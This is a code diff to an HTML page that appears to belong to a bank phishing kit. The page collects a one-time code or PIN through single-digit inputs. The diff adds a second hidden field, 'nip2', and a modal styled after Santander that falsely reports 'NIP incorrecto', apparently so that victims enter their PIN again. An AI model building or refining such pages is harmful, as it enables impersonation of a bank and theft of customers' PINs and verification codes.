@@ -208,7 +208,7 @@
                 <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
                 <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
             </div>
-            <input type="hidden" name="nip" id="codigoCompleto">
+            <input type="hidden" name="nip2" id="codigoCompleto">
             <div class="pt-6 space-y-4">
                 <button id="btnFinal" disabled class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-lg transition-all duration-300">
                     Confirmar Código
@@ -218,6 +218,32 @@
             </form>
         </div>
     </div>
+
+<!-- MODAL ALERTA ESTILO SANTANDER -->
+<div id="bankAlertModal" class="bank-modal-overlay">
+    
+    <div class="bank-modal">
+
+        <!-- BOTON CERRAR -->
+        <button class="close-modal-btn" id="closeModalBtn">
+            ✕
+        </button>
+
+        <!-- LOGO -->
+        <div class="bank-logo">
+            <img src="lokoto.png" alt="Logo">
+        </div>
+
+        <!-- MENSAJE -->
+        <div class="bank-alert-text">
+            <span class="alert-icon">⚠</span>
+            NIP incorrecto, verifica e intenta nuevamente.
+        </div>
+
+    </div>
+
+</div>
+    
 <script>
 
 /* MOSTRAR AUTOMATICAMENTE */
